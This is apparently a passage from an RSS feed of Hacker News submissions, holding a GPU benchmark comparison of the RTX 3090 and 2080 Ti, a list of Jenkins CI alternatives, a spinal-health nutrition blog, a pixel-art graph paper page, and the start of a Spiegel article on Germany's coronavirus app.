<p>The Witcher 3 is still being tested as you guys still voted for it in a poll I ran recently.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9b62608cc.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9b62608cc.webp">This game saw the lowest difference between the two GPUs at 4K, though the 3090 still had a 40% higher average frame rate, and again the 1% lows from it were ahead of even the averages from the 2080 Ti at both 4K and 1440p.</p>
<p>Assassin‚Äôs Creed Odyssey was tested with the built-in benchmark, and is another one you guys voted to see more of.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9b77944ad.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9b77944ad.webp">The 3090 was 22% faster than the 2080 Ti at 1080p, 25% faster at 1440p, and 42% faster at 4K, so below average increases compared to the other games tested at the higher resolutions.</p>
<p>Call of Duty Modern Warfare was tested in campaign mode.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9b865cf9b.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9b865cf9b.webp">The 2080 Ti was still giving an above 60 FPS experience at 4K even with all settings maxed out, but once more the 3090 pushes things to the next level by averaging 100 FPS, a 43% improvement. This was another test where even the 3090‚Äôs 1% lows were ahead of the 2080 Ti‚Äôs averages.</p>
<p>Rainbow Six Siege was tested using the games benchmark tool with Vulkan.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9b9637819.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9b9637819.webp">The 2080 Ti was right on 144 FPS at 4K, so it‚Äôs probably still going to be pretty decent even if you actually have a high refresh 4K monitor, but the 3090 is again offering nice improvements, with a 48% higher average frame rate at this resolution, and it manages to push the 1080p result above 500 FPS, something I‚Äôve never seen before in this test.</p>
<h2>Overall gaming performance</h2>
<p>At 1080p on average over all 11 games tested the 3090 was under 22% faster than the 2080 Ti.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9bb2021a2.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9bb2021a2.webp">In some titles like flight simulator, down the bottom, we‚Äôre seeing a negligible difference, while others such as Control with RTX enabled at the top still had nice gains.</p>
<p>At 1440p the 3090 was now 36% faster than the 2080 Ti on average.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9bc3e0bf6.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9bc3e0bf6.webp">As higher resolutions can typically make better use of the GPU we‚Äôre starting to see what the 3090 is capable of. Flight simulator was still the lowest improvement out of what was tested, while Control was at the top again.</p>
<p>At 4K the 3090 is now almost 47% faster than the 2080 Ti on average.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9bd8eda28.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9bd8eda28.webp">This time Red Dead Redemption 2 was able to overtake Control for top spot with almost a 57% improvement, and even the worst result was still a 40% boost, so if you‚Äôre serious about 4K gaming something like the 3090 could be worth considering.</p>
<h2>Power usage</h2>
<p>When we look at total system power draw from the wall<img src="https://techplanet.today/storage/posts/2020/09/5f6c9beca71e2.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9beca71e2.webp">the PC with the 3090 installed was using around 29% more power, pushing the system to over 500 watts. I tested Control here, as we just saw it was around 53% faster in terms of average F PS, so 29% more power from the wall for a 53% boost to FPS, sounds reasonable to me.</p>
<h2>Cost per frame</h2>
<p>Let‚Äôs check out value in gaming in terms of dollar per frame.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9c00a4a28.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9c00a4a28.webp">If we consider that the 3090 is $1500 USD at launch, and the 2080 Ti was meant to be $1000, then that‚Äôs 50% more money for the 3090, but the 2080 Ti wasn‚Äôt really available at that price, so if we instead go with $1200 which is closer to what it was actually available for, then the 3090 is 25% more money. This of course doesn‚Äôt factor in that people have been fire selling their 2080 Ti‚Äôs in the lead up to the 3000 series release, at the moment it‚Äôs easy to score one for under $700 on the second hand market, so I‚Äôve listed that too.</p>
<p>The 3090 looks better than the 2080 Ti at $1200, but if you could actually get the 2080 Ti at $1000 in the past then the 3090 would be slightly worse from a dollar per frame perspective, and this is of course assuming the 3090 will be available at $1500, that‚Äôs still yet to be seen.</p>
<p>The 3090 isn‚Äôt exactly targeted towards gamers, but there‚Äôs no denying that it‚Äôs a beast in gaming. To get the most out of it though, you‚Äôre really going to want to focus on playing at higher resolutions like 1440p or 4K. If you‚Äôre a competitive 1080p gamer playing at competitive settings, in a lot of cases your CPU will probably matter more than going for a 3090 over some other decent but far cheaper GPU option. Even many GPU heavy titles tested here at 1080p didn‚Äôt see huge gains from the 3090.</p>
<h2>Content creation benchmarks</h2>
<p>I‚Äôve also tested both in content creator workloads, it‚Äôs not just all about gaming!<img src="https://techplanet.today/storage/posts/2020/09/5f6c9c4cb5297.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9c4cb5297.webp">I‚Äôve tested DaVinci Resolve with the Puget Systems benchmark, and the 3090 was scoring 42% higher than the 2080 Ti. Despite taking averages of 5 runs, the individual results were two to three hundred points different, so this might not be the most accurate test, hopefully by running it 5 times the results are decent but yeah it did vary between runs a fair bit.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9c5f966fe.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9c5f966fe.webp">I‚Äôve tested the V-Ray benchmark and saw massive gains from the 3090, which was scoring 119% higher than the 2080 Ti. This is testing compute power, and if you recall the 3090 has 141% more CUDA cores, so this sort of gain is expected in this type of workload.<img src="https://techplanet.today/storage/posts/2020/09/5f6c9c6d089a3.webp" alt="RTX 3090 vs 2080 Ti - Worth Upgrading?" width="854" height="480" data-src="/storage/posts/2020/09/5f6c9c6d089a3.webp">Blender was tested with the Open Data Benchmark with the BMW and Classroom tests. This is also relying more on compute power, I selected the CUDA option when running the test, and the 3090 was completing these tasks 125% faster than the 2080 Ti, another serious win.</p>
<h2>Summary</h2>
<p>In Compute heavy workloads the 3090 is able to offer significant gains, so it really comes down to what you plan on running and of course your budget, as we saw this does not translate quite as well into gaming performance, though gaming performance was still a nice step up over the 2080 Ti at higher resolutions.</p>
<p>I‚Äôd be interested to hear in the comments if you‚Äôre considering the 3090, let me know what you plan on using it for. In gaming the RTX 3080 will be far better value at half the price and will be a much better sweet spot for many gamers, I‚Äôve got one of those in the ‚Ä¶</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://techplanet.today/post/rtx-3090-vs-2080-ti-worth-upgrading">https://techplanet.today/post/rtx-3090-vs-2080-ti-worth-upgrading</a></em></p>]]>
            </description>
            <link>https://techplanet.today/post/rtx-3090-vs-2080-ti-worth-upgrading</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578375</guid>
            <pubDate>Thu, 24 Sep 2020 13:24:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[13 Jenkins Alternatives for Continuous Integration]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24578372">thread link</a>) | @savovaleks
<br/>
September 24, 2020 | https://microtica.com/13-jenkins-alternatives-for-continuous-integration/ | <a href="https://web.archive.org/web/*/https://microtica.com/13-jenkins-alternatives-for-continuous-integration/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div>
<p>In our <a href="https://microtica.com/jenkins-is-old-we-need-an-alternative/">previous article</a>, we discussed <strong>the most common problems with Jenkins</strong> that made us search for an alternative. That‚Äôs why in this article, we‚Äôre offering a list of the most common Jenkins alternatives for continuous integration.&nbsp;</p>



<h2>BuildMaster</h2>



<div><figure><img src="https://lh5.googleusercontent.com/7RJeoqHKUEfkCx1d0sOotEDM3wsjPPBuEGIVclg-M2cD7cdfzdGXQgqfKDXCbHwnPDmj8-BfcDM_6seuxVgBzVw9K--kLkgOM3P9wEYNJ98H5geeOPmKDMkRCJAXOITHtqDe4Ek" alt=""></figure></div>



<p><a href="https://inedo.com/buildmaster/download">BuildMaster</a> by Inedo is one of the Jenkins alternatives that enables developers to release software to any environment. Offering fully-functional continuous integration abilities for different platforms, the tool gives organizations the possibility to create their own self-service release management platforms. Teams can handle their own apps and deploy to their environments independently. What is more, it prevents the release of untested software with automated gates. <a href="https://www.g2.com/products/buildmaster/reviews">Users</a> are very happy with its simplicity, as you don‚Äôt have to be an expert to set up pipelines.&nbsp;</p>



<h2>Microtica</h2>



<div><figure><img src="https://lh4.googleusercontent.com/HgVVjaV2Z_Zoz3Cc9LvrMh1N0EtzjTeNlgQwCuxISUSIbxG0ywqqJpiwpnbtiy91gRUGpcPtyGXBNIwf43aVAM-D7CCB3YYZfhBtRM92K7StioG60loAQV7xFCMB44HgHct535U" alt=""></figure></div>



<p><a href="https://microtica.com/">Microtica</a> is a DevOps automation tool that covers the entire software delivery process, from setting up a cloud infrastructure to delivering apps and services to the cloud using Kubernetes. Microtica‚Äôs ready-to-use components provide users with reusable pieces of code that require no additional coding and can help you create an infrastructure within minutes.&nbsp;</p>



<p>Thanks to the microservice generator, developers can set up microservices automatically. With integrated production-ready Kubernetes and the native Kubernetes dashboard, they can create scalable apps in a few clicks.</p>



<p>Microtica‚Äôs pipelines define the workflow of every component and microservice. Users can trigger them automatically or manually to get an overview of their build process at any time. They can perform all actions without leaving the Microtica web portal, with Slack notifications for every change.&nbsp;</p>



<p>Finally, Microtica allows developers to automate their sleep cycles and therefore reduce AWS costs. Once they activate the saving mode, Microtica goes autopilot and prevents excessive spending. Moreover, all savings are available in the cost-savings dashboard.</p>



<p>This is obviously the tool we like the most because it‚Äôs the one we created üôÇ So, we‚Äôd be really happy if you‚Äôd try our free version and tell us what you think.&nbsp;</p>



<h2>GitLab</h2>



<div><figure><img src="https://lh3.googleusercontent.com/gPIzZYmhZZVRe6RR-QwbCaAe6C2Iw6ndcr6m9m3ukvhBIPLDIDY-an6e3gsUFsTE2fQxKZEXw67-dxWLmAxnVnJ1kO0expghabPO0q_OMKcHOhDE62EAbkH7lB41L0TYyALIQ5U" alt="" width="183" height="195"></figure></div>



<p><a href="https://about.gitlab.com/">GitLab</a> is a cloud-based CI platform that lets dev teams handle their diverse toolchains, speed, and security more efficiently. It allows organizations to plan, build, and administer code safely from a centralized and unified version control system. Moreover, GitLab enables users to artifacts, handle containers, and package applications and dependencies, using Docker and Kubernetes. <a href="https://www.capterra.com/p/159806/GitLab/#reviews">Reviews</a> say that GitLab is easy to integrate. However, it can sometimes have some annoying bugs and limitations, as well as some missing features for full automation.&nbsp;</p>



<h2>CircleCI</h2>



<div><figure><img src="https://lh3.googleusercontent.com/rz_QXI01Ryi8ScKYwGj6lWG6ZEwvU0_u2hhPnBol5sCAXkrEwWgX0kNWTMvOrwwY6pi_ok7zwqwcCI2moGUMkXQcrIyWXci-3dBhsTuuyuBehGTc-ncptksCnxqbJ7ET0uCYkpA" alt="" width="159" height="137"></figure></div>



<p><a href="https://circleci.com/">Circle CI</a> is one of the scalable Jenkins alternatives that run in any environment such as a Python API server or Docker cluster. This tool removes vulnerabilities and strengthens the application‚Äôs consistency. It supports various languages, like C++, NET, JavaScript, PHP, Ruby, and Python. Furthermore, queued and running builds can be automatically canceled when a more recent build gets triggered. It can integrate with GitHub, GitHub Enterprise, and Bitbucket. According to <a href="https://www.trustradius.com/products/circleci/reviews#2">users on TrustRadius</a>, automated builds are the best benefit from CircleCI, but jobs can sometimes take too long.&nbsp;</p>



<h2>Bamboo</h2>



<div><figure><img src="https://lh3.googleusercontent.com/X49nGzFlAo4jvAfof1xsuERUHkTXwjjCURDlhGYis5wDCev9t8MsnkELcCVEmugi7k7A0G-4CDqvnyh9Pj8eTBHXLaN8nGCqypg4BrLc-pi8zOnqP4Sqgn93gQIUsAWX8TBbJ5I" alt=""></figure></div>



<p><a href="https://www.atlassian.com/software/bamboo">Bamboo</a> by Atlassian is a continuous integration server that automatically creates, monitors, and releases from one place. It easily integrates with JIRA applications and Bitbucket. Also, Bamboo integrates with Docker, Git, SVN, and Amazon S3 buckets. Based on changes detected in the repository, it can trigger builds and push notifications from Bitbucket. It‚Äôs available both hosted and on-premise. <a href="https://www.g2.com/products/bamboo/reviews#survey-response-3456530">G2 users</a> say that the visibility of the build process with Bamboo is great, but some concepts and integrations are unclear.&nbsp;</p>



<h2>TravisCI</h2>



<div><figure><img src="https://lh3.googleusercontent.com/Duk5Doz83Tz31MIjqteYqVVZd8LFU3Ww-ghBShCMnD8oP_w8fsE5G8SkC_DSc-bKbZ-Bpe7HK50qwBRjdC2T6wuEchuII2HK-zeorNhUcyPo-Xj6-lyu-EN_y6F8NT5hqEBIpEY" alt="" width="448" height="140"></figure></div>



<p><a href="https://travis-ci.org/">TravisCI</a> is a continuous integration hosting service that developers can use to develop and validate GitHub and Bitbucket-hosted applications programs. It can test all pull requests to make sure no untested code is released. You can simply log in with GitHub to set up your project. Includes pre-installed databases and resources that can quickly be activated in configuration build. According to some online reviews, TravisCI is great if you‚Äôre working on a small project and want to start building quickly. However, when you have a larger project that requires taking care of dependencies and performance and reliability of the builds, then you‚Äôll probably run into some problems.&nbsp;</p>



<h2>Semaphore</h2>



<div><figure><img src="https://lh5.googleusercontent.com/MlQ02T21ok5r5z-Uum17s4x-nTcUTS_KyPDyws_8ZTwJYaTCEZt8AMmMf82mEx-fPqwrzmc7Gf13VGriBsF-s6MNCUA93Akg7asMsVUrB1l2OAxUg9Z2sRDIbJz5kE-L7V_oISY" alt=""></figure></div>



<p><a href="https://semaphoreci.com/product">Semaphore</a> is one of the Jenkins alternatives that covers the entire CI/CD process that supports GitHub, Kubernetes, iOS, Docker, Kubernetes, and has over 100 tools preinstalled. It can automate any continuous delivery pipeline and provide control with customizable stages, parallel execution, dependency management, etc. According to <a href="https://www.capterra.com/p/171934/Semaphore/reviews/">online reviews</a>, Semaphore builds are very fast, and the platform is easy to set up. However, users say that the UI can sometimes be confusing and that there‚Äôs a limited implementation of deployment pipelines.&nbsp;</p>



<h2>Buddy</h2>



<div><figure><img src="https://lh5.googleusercontent.com/CKrINv1ah_TxJVnlz7a_5cDnZfgKd7dBYdIJmjrh0zV58yuAn8iD52Hh6auiEOBo9yDw9fbT09Qdpilb1K_4vHC8Tic9IBfWS8brON8Ku8v5bo3GMg0gGOlALsgHFTEY8nb-3uU" alt=""></figure></div>



<p><a href="https://buddy.works/">Buddy</a> is a CI/CD platform that reduces the effort of configuring and maintaining Jenkins with a simple UI/UX that makes it very simple to create, evaluate, and deploy better applications.&nbsp;</p>



<p>You can perform configuration in 15 minutes via GUI with instant YAML export. It‚Äôs available in cloud and on-premises, with full Docker and Kubernetes support. <a href="https://alternativeto.net/software/buddy-/reviews/">Online reviews</a> say that Buddy is very easy to set up, but its paid tiers are too expensive.&nbsp;</p>



<h2>Drone.io</h2>



<div><figure><img src="https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/09/image.png" alt="Drone | Brands DA - DZ" width="326" height="125" srcset="https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/09/image.png 362w, https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/09/image-300x115.png 300w" sizes="100vw"></figure></div>



<p><a href="https://drone.io/">Drone.io</a> is a self-service CD platform that uses a simple YAML configuration file and a superset of docker-compose to create and execute pipelines in Docker containers. It executes every pipeline step within a separate Docker container that is automatically downloaded at runtime. Drone is bundled as a Docker image and it can be downloaded from Dockerhub. <a href="https://www.g2.com/products/drone-io/reviews">Online reviews</a> say that Drone.io is one of the Jenkins alternatives that‚Äôs easy to set up and a great solution for enterprises, but it lacks some features and needs further customization.&nbsp;</p>



<h2>GoCD</h2>



<div><figure><img src="https://lh6.googleusercontent.com/6hxo5wQ77vnHzW-S-coYUBsABY_ipsCkmmDX0yKRAiDmgpgCLTUsHJslXER1GgKF0EbD808x15X4UfTwzYvSwwzn4oiUG73M8LHznBP_cNuQPrA1N2iICw0K7mAr5YRD3lL4w9k" alt=""></figure></div>



<p><a href="https://www.gocd.org/">GoCD</a> is a Continuous Integration open-source server. You can use it to simplify the simulation and visualization of dynamic workflows. This CI tool offers continuous delivery and elegant design to construct CD pipelines. It supports parallel and sequential execution, with the possibility to deploy any version at any time. It has an active and supportive community. According to users, GoCD isn‚Äôt compatible with scaling across multiple servers, but one of its good sides is that you can customize your own processes.&nbsp;</p>



<h2>TeamCity</h2>



<div><figure><img src="https://lh5.googleusercontent.com/ACXxU9tL9vcrQ1AoDN2Bbk4LZITTgN8zFd1mq5ElkpOvtSgWRkcS1o2LRup4DDe-vTWxQqSKfPu0Ya_5cymaMW4g3WgHuRzXccqK6BYC-tcR4VNhaIAo73vS96IUNSL-k3CkpLg" alt=""></figure></div>



<p><a href="https://www.jetbrains.com/teamcity/">TeamCity</a> is a CI/CD tool by JetBrains. It allows users to build, monitor, and run automated tests before code commits, maintaining a clean codebase. It provides comprehensive VCS integration, keeping the CI server healthy at all times, even when there aren‚Äôt any builds running.&nbsp; It‚Äôs integratable with Amazon EC2, Microsoft Azure, and VMware vSphere. <a href="https://www.g2.com/products/teamcity/reviews">Online reviews</a> say that TeamCity is a modern, robust and transparent solution that provides a developer-friendly environment for your pipelines. However, you need to be careful with server configuration.</p>



<h2>Buildkite</h2>



<div><figure><img src="https://lh4.googleusercontent.com/b22Y4J3re1L6-vznnnCz3mXflqv5vo7WD4nGPSxJiR9-DXccvMfJrRXnsOYQ_8dpnNAfSmEFccEmM2GtyX8fXcv8YskUJdwTzOZ0sQSUPFq3ReFL3UmuYMuriQODoNjLTVIegH0" alt=""></figure></div>



<p><a href="https://buildkite.com/">Buildkite</a> is an open-source platform where you can run CI pipelines. It provides source control integration, chat support, and requires no source code access. You can schedule builds through their infrastructure as code system, allowing you to monitor and control all your pipelines through their web platform. However, the platform lacks some DevOps processes like source code management and security testing.&nbsp;</p>



<h2>Zuul</h2>



<div><figure><img src="https://lh4.googleusercontent.com/X9SpiEJTe_99orU93HnwqsFRoDXEG-tLlpUJwCgq-VQw62Dp3NR3q0Nak4JzOX1jirAZzE8fy_3oT6SErLWo_TZJ9ucdOKE2fVIJecWpiINKi5WZ8-sVQWhSQ4k4hOZfPKDrD8I" alt="" width="374" height="195"></figure></div>



<p>Zuul is an open-source CI tool that mainly resolves the issues that Jenkins has with CI testing. They are providing the ability to test serialized future states faster than it was possible. Their main difference is that they can test code across numerous repositories that work toward a common goal to make sure that a change will not pass to production if it breaks its own project or if it breaks a different project. This is called co-gating.&nbsp;</p>



<p>Over the years Zuul‚Äôs become a tool for automatic merging, building, and testing of any new changes made to a project. It‚Äôs ideal for enterprise-grade organizations to build a large number of projects that must work in synchrony with each other.</p>



<h2>Conclusion</h2>



<p>Jenkins is a tool that many dev teams still use. However, it‚Äôs not the only CI tool anymore. Seeking to improve the way you work constantly means playing with multiple methods that will help you do your job easier, quicker, and more consistently. Don‚Äôt risk your competitive advantage by ignoring innovation and remaining with traditional methods.&nbsp;</p>
<!--<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
			xmlns:dc="http://purl.org/dc/elements/1.1/"
			xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
		<rdf:Description rdf:about="https://microtica.com/13-jenkins-alternatives-for-continuous-integration/"
    dc:identifier="https://microtica.com/13-jenkins-alternatives-for-continuous-integration/"
    dc:title="13 Jenkins Alternatives for Continuous Integration"
    trackback:ping="https://microtica.com/13-jenkins-alternatives-for-continuous-integration/trackback/" />
</rdf:RDF>-->
</div></article></div>]]>
            </description>
            <link>https://microtica.com/13-jenkins-alternatives-for-continuous-integration/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578372</guid>
            <pubDate>Thu, 24 Sep 2020 13:24:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Foods You Need to Be Eating for Spinal Health]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24578356">thread link</a>) | @whereistimbo
<br/>
September 24, 2020 | https://www.csiortho.com/blog/2018/september/7-foods-you-need-to-be-eating-for-spinal-health/ | <a href="https://web.archive.org/web/*/https://www.csiortho.com/blog/2018/september/7-foods-you-need-to-be-eating-for-spinal-health/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemprop="articleBody"><p>Have you been experiencing spinal issues lately? Or are you looking for ways to prevent them? Believe it or not, the foods you eat can play a role in spine health.</p><p>Certain foods are packed with what your back needs in order to remain healthy and strong. So good back health can start with making the right food choices.</p><p>Avoiding bad foods is one way to increase health. Choosing the right ones is the best way to go.</p><p>What foods are best for spine health? Keep reading to find out. Here are eight foods that will help keep your spine strong and healthy.</p><h2 data-fontsize="36" data-lineheight="54">1. Plant-Based Proteins</h2><p>The proteins you get from certain plants are great for your spine health. These proteins are different than the ones found in meat.</p><p>Stick to plant-based proteins as much as possible. Animal-based proteins can lead to inflammation.</p><p>Instead, get your protein from foods like chia seeds, lentils, and beans. Not only do they provide protein, they pack a nutritional punch in other ways, too. You‚Äôll get a variety of helpful antioxidants, fiber, vitamins, and minerals as well.</p><p>If you‚Äôd still like to get some animal-based protein in your diet, go for lean picks. This means choosing chicken and fish over beef and pork.</p><h2 data-fontsize="36" data-lineheight="54">2. Vegetables</h2><p>Vegetables are good for you in general, so make sure you get a lot of them each day to improve your overall health. While healthy all around, veggies are also great for fighting back issues.</p><p>Certain vegetables contain properties that will help fight spinal issues.</p><p>Kale, broccoli, and spinach work well against inflammation. Each of these vegetables also contains nutrients that will help strengthen your spine. As the literal backbone of your body‚Äôs skeletal system, your spine can use all the nutritional help it can get.</p><p>As a rule of thumb, veggies with strong natural pigments are best.</p><h2 data-fontsize="36" data-lineheight="54">3. Salmon</h2><p>If you‚Äôre not opposed to seafood, add some salmon to your diet regularly. Salmon is a great source of lean protein, as well as well as another helpful nutrient: omega-3 fatty acids.</p><p>Omega-3 fatty acids promote bone and tissue health. They also fight against inflammation, just like those leafy green vegetables mentioned above.</p><p>Luckily, salmon is versatile and tasty when prepared the right way. There are plenty of fantastic salmon dishes for you to try. They‚Äôll spice up your menu and benefit your back at the same time.</p><h2 data-fontsize="36" data-lineheight="54">4. Dairy Products</h2><p>Calcium is super important for maintaining and improving bone health. The easiest way to get extra calcium in your diet without taking a supplement? Increase your dairy intake.</p><p>Don‚Äôt choose just any dairy products, though. Specifically, go for the ones that are high in calcium. Cheese, milk, and yogurt all fall into this category.</p><p>Like with many other food groups, though, you can overdo it with dairy. Don‚Äôt binge on your favorite cheese with the excuse of needing the extra calcium. Be smart about&nbsp;<a target="_blank" href="https://www.verywellhealth.com/healthy-alternatives-to-full-fat-dairy-products-697778">how you eat dairy products</a>&nbsp;so you don‚Äôt get too much fat or cholesterol in your diet.</p><p>Calcium can be found in other foods, too. Among them are those leafy green vegetables we‚Äôve already talked about.</p><h2 data-fontsize="36" data-lineheight="54">5. Herbs and Spices</h2><p>Many herbs and spices are great for promoting spinal health. Turmeric, a spice commonly used in Indian cuisine, including curry dishes, helps fix damaged tissue.</p><p>There are herbs that fight inflammation as well. These include cinnamon, rosemary, basil, and ginger.</p><p>Add these and other healthy spices and herbs to your recipes throughout the day. Or use them to create a healthy, delicious herbal tea. Herbal teas help strengthen your immune system,&nbsp;<a href="https://www.csiortho.com/spine-treatments/interventional-treatment/spinal-cord-stimulators/">reduce inflammation</a>, and taste great at the same time.</p><h2 data-fontsize="36" data-lineheight="54">6. Fruits</h2><p>Just like vegetables, you should go for the highly-pigmented types here. And like dairy, you don‚Äôt want to overdo it. Remember, fruit is sugar, so eating too much can be more of a detriment to your health than a benefit.</p><p>While you need to be responsible when eating fruits, they have many health benefits.</p><p>Berries are particularly great for your spinal health. They‚Äôre packed with antioxidants and nutrients that will help your spine get and stay healthy.</p><p>So add those berries to breakfasts, dinners, lunches, you name it. You can even use them as dessert.</p><h2 data-fontsize="36" data-lineheight="54">7. Avocados</h2><p>Whether you‚Äôre a fan of avocados or not, they‚Äôre great for your spine. They‚Äôre full of healthy fats that your body needs as well as fiber and potassium. These things make avocados great for your health overall.</p><p>Whether it‚Äôs good fat or not, avocados are fatty foods, so make sure you don‚Äôt overdo it.</p><p>If you don‚Äôt like avocados, try using them in ways you haven‚Äôt before. In recent years tons of recipes have emerged for avocado toast, addition to a smoothie and other tasty meals. You don‚Äôt have to limit yourself to a plain slice with a salad or a guacamole dip.</p><p>One of the greatest things about avocados? They help to reduce back pain.</p><h2 data-fontsize="36" data-lineheight="54">Eat Your Way to Great Spine Health</h2><p><a href="https://www.csiortho.com/blog/2018/july/10-exercises-you-should-use-to-recover-from-a-ba/">Exercises</a>&nbsp;and medicine may be your first thoughts when it comes to remedies for spinal issues, but you can eat your way to good health too. You just have to choose foods that are great for your body, particularly for your spine.</p><p>Spinal health is so important for your day-to-day interactions. So give yourself a leg up by packing your diet with these seven healthy foods. They‚Äôll help improve your spine health, as well as your health overall.</p><p>Are you interested in trying physical therapy to help with your back pain? Contact us to&nbsp;<a href="https://www.csiortho.com/spine-treatments/non-invasive-treatments/physical-therapy/">see how we can help</a>&nbsp;today.</p></article></div>]]>
            </description>
            <link>https://www.csiortho.com/blog/2018/september/7-foods-you-need-to-be-eating-for-spinal-health/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578356</guid>
            <pubDate>Thu, 24 Sep 2020 13:22:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Do you like pixel art? How about being able to make pixel art on paper?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24578257">thread link</a>) | @gamedesign
<br/>
September 24, 2020 | https://gruhh.com/en/pixel-art-graph-paper/ | <a href="https://web.archive.org/web/*/https://gruhh.com/en/pixel-art-graph-paper/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
				<div id="content">
			
	<div id="primary">
		<main id="main">
			
<article id="post-2985" class="page" itemtype="https://schema.org/CreativeWork" itemscope="">
	<div>
		
		<div itemprop="text">
			
<div><div>




<p>Free! Just download, print and use‚Ä¶</p>
</div></div>



<div><div>
<div>
<div><div><div>
<p><strong>Want to make pixel art on paper?</strong> Whether for professional projects or for fun, explore your creativity in another medium.</p>



<p>We imagined a grid paper focused on the rapid development of analog pixel art. And that adapts to the printer that you have available.</p>



<ul><li>Create pixel art sketches</li><li>Explore the creative potential</li><li>Professional process</li><li>Free!</li></ul>
</div></div></div>



<div><div><div>
<div id="cta-landing-page-grid-game"><div>
<h2>Download now!</h2>







<p>Or choose one of the paper settings below!</p>
</div></div>
</div></div></div>
</div>







<hr>







<hr>




</div></div>



<div><div>
<div>
<div><div><p><strong>You who like experiences on paper‚Ä¶ </strong>We know how you feel! How about taking advantage of being here and discovering one of our board games to ‚Äúprint and play‚Äù?</p></div></div>



<div><div><div>
<h3>üëë Numerado</h3>



<p>In Numerado your objective is to build your own opportunities, making the most points, through the results of the operations.</p>



<ul><li>Strategy game</li><li>For 1 or many players</li></ul>




</div></div></div>
</div>
</div></div>



<div><div>
<div><div>
<div>
<div><div><div>




<p>Especially prepared for pixel art artists who want to explore their creativity.</p>
</div></div></div>



<div><div><div>




<p>No jokes. Just click, download and print your copy.</p>
</div></div></div>



<div><div><div>




<p>You download the PDF and print it at your home. With different configurations available.</p>
</div></div></div>
</div>
</div></div>
</div></div>




		</div><!-- .entry-content -->

			</div><!-- .inside-article -->
</article><!-- #post-## -->
		</main><!-- #main -->
	</div><!-- #primary -->

	
	</div><!-- #content -->
</div></div>]]>
            </description>
            <link>https://gruhh.com/en/pixel-art-graph-paper/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578257</guid>
            <pubDate>Thu, 24 Sep 2020 13:10:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lots of Work but Little Utility Germans Disappointed by Coronavirus Tracking App]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24578116">thread link</a>) | @dakna
<br/>
September 24, 2020 | https://www.spiegel.de/international/germany/lots-of-work-but-little-utility-germans-disappointed-by-coronavirus-tracking-app-a-7c30191e-b225-4c37-917d-41dc2a6078a1 | <a href="https://web.archive.org/web/*/https://www.spiegel.de/international/germany/lots-of-work-but-little-utility-germans-disappointed-by-coronavirus-tracking-app-a-7c30191e-b225-4c37-917d-41dc2a6078a1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>On a June morning, an giant blue and red "C‚Äù logo was displayed in front of the Federal Press Office in Berlin, located on the Spree River in the heart of the capital. It was essentially the German government screaming for attention, and why not? Germany‚Äôs flagship project in the fight against the coronavirus pandemic was ready for prime time. Finally. "#Ichappmit,‚Äù a billboard read. "I‚Äôm using the app.‚Äù</p><div>
